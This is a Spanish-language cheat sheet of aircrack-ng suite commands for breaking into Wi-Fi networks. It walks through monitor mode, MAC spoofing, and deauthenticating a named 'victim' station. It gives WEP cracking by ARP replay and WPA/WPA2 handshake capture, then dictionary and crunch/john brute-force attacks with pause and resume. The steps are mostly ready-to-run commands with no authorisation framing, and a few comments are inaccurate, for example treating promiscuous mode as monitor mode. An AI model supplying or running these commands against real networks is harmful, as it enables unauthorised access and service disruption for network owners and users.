#COMANDOS DE LINUX 

ifconfig -> Nos Muestra las interfaces de Red 
iwconfig -> Nos dira cual es nuestra interfaz wifi 

ifconfig wlan0 up #Comando para levantar la interfaz
ifconfig wlan0 down #Comando para levantar la interfaz

#MODO MONITOR
#Modo premiscuo es igual a modo monitor
#Forma 1
airmon-ng start wlan0
#Forma 2
iwconfig wlan0 mode monitor 
iwconfig
airmon-ng check kill  #Mata los procesos de la interfaces
#service network manager start #Iniciar procesos de interfaces
#sservice wpa_supplicant start

#MODO NOMAL
iwconfig wlan0 mode managed 


#Una vez levantada la interfaz cambiaremos la MAC
ifconfig wlan0mon down #Comando para levantar la interfaz
macchanger -m 00:11:22:33:44:66 wlan0mon 
ifconfig wlan0mon up #Comando para levantar la interfaz

#La MAC se compones de numeros y letras mayusculas y minusculas de la "a" a la "f"
#La MAC empieza con 00

#OLFATEAR O BUSCAR REDES
#Airodump
#-Captura paquetes dentro de un rango 
#-Mustra informacion importante de las redes
#airodump-ng "interfaz en modo monitor"
airodump-ng wlan0mon

BSSID #Direccion MAC del ROuter
PwR #Indica la potencia en decibelios (señal) Entre mas aya mejor
Beacons #Paquetes de transmision para que los dispositivos puedan ver la existencia de la RED
Data #Paquetes con autentificacion que contienen el password encriptado del protocolo wifi usado (Conocido como paquetes VI)
CH #Canal por que transmite el router
MB #Velocidad de transmision
CIPHER #Tipo de cifrado usado
AUTH #Tipo de autentificacion de usuarios
ESSID #NOmbre de la conexion wifi


Bandas Wifi (2.4 , 5Ghz)
Determina los canales usados
Badas COmunes 
a -> solo 5Ghz
b,g -> solo 2.4Ghz
n -> 5 y 2.4Ghz
ac < 6Ghz
El adaptador de red debe soportar la tecnologia

#Escanear redes con tipo de banda
airodump-ng --band a "interfaz_modo_monitor"
airodump-ng --band abg "interfaz_modo_monitor"

#Escanear una red en especifico
airodump-ng --bssid "DIreccion MAC" --channel "Numero Canal" --write "nombre_archivo" "interface"
airodump-ng wlan0mon --channel 1 --bssid 00:87:86:98:97:79 --write /tmp/test
Nombre del Archivo a capturar 
Canal que trasmite el router 
Mac del ROuter 
INterfaz en modo monitor

#Desautenticar a un usuario
aireplay-ng -0 50 -a "Mac del Router" -e "essid de la red objetivo" wlan1mon

aireplay-ng --deauth 4 -a "BSSID DEL ROUTER" -c "STATION DE LA VICTIMA" wlan1mon 

aireplay-ng --deauth 100 -a "BSSID DEL ROUTER" -c "STATION DEL_LA_VICTIMA" wlan1mon &>/dev/null&

&>/dev/null&  redirige el output a la nada
#con el comando "jobs" se ven los trabajos
#con el comando "kill" se mata el trabajo


#Obtener el nombre de la red desconocida  <length:  0> 
1: Olfatear la REd en especifico
airodump-ng --bssid "DIreccion MAC" --channel "Numero Canal" "interface"

2:Esperar a que un dispositivo se connecte a esa red y aparecera el nombre


#Hackear redes WEP
1: Olfatear la REd en especifico
airodump-ng --bssid "DIreccion MAC" --channel "Numero Canal" --write "nombre_archivo" "interface"
2: Esperar a otener 5000 en #Data
#Mandar datos #Data si la red esta inactiva o para que avance mas rapido
aireplay-ng --arpreplay -b "bssid_del_router" -h "mac_de_nosotros" "interfaz"
3: DIrigirnos a la ruta del archivo cap y ejecutar aircrack-ng 
aircrack-ng "archivo".cap


#Autentificacion Falsa
#Sirve para WEP, WPA , WPA2
#Se tiene que realisar mientras aerodump-ng olfatea la red en especifico
aireplay-ng --fakeauth 0 -a "bssid_del_router" -h "mac_de_nosotros" "interfaz"

#Hackear WPA y WPA2 
WPA utiliza cifrado TKIP 
WPA2 utiliza cifrado CCMP 

1: Olfatear la REd en especifico
airodump-ng --bssid "DIreccion MAC" --channel "Numero Canal" --write "nombre_archivo" "interface"
2: Obtener Handshake
Esperar que un dispositivo se connecte o desautentificar a uno
aireplay-ng --deauth 100 -a "BSSID DEL ROUTER" -c "STATION DEL_LA_VICTIMA" wlan1mon &>/dev/null&
3: Crear el diccionario



#CRAKEAR CON AIRCRACK
aircrack-ng [archivo.cap] -w [ruta/wordlist]

aircrack-ng -w [ruta/wordlist] -b [handshake] [archivo.cap] 


#PAUSAR UN ATACKE DE DICCIONARIO
1. Recorrer diccionario con john the ripper y redireccionarlo a aircrack 
john --wordlist=[diccionario] --stdout --session=wpa | 
aircrack-ng -w - -b [ESSID_ROUTER] [archivo.cap]
#pulsa ctrl-c 
#Restaurar el atacke con el nombre de la session 
john --restore=wpa | 
aircrack-ng -w - -b [ESSID_ROUTER] [archivo.cap]


#ATACKE DE DICCIONARIO SIN ESPACIO EN EL DISCO
#ES un metodo donde se generan y se prueban las contraseñas generadas en tiempo real
#COnsiste en pasarle el output de cruch a aircrack-ng
crunch 16 16 | aircrack-ng -w - -b [ESSID_ROUTER] [archivo.cap]


#PAUSAR ATACKE DE DICCIONARIO SIN ESPACIO EN EL DISCO
#8 caracteres aleatorios
crunch 8 8 | john --stdin --session=wpa --stdout | aircrack-ng -w - -b [ESSID_ROUTER] [ARCHIVO.cap]
#16 caracteres numeros y letras
crunch 16 16 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ | john --stdin --session=wpa --stdout | aircrack-ng -w - -b [ESSID_ROUTER] [ARCHIVO.cap]
crunch 8 8 | john --restore=wpa | aircrack-ng -w - -b [ESSID_ROUTER] [ARCHIVO.cap]

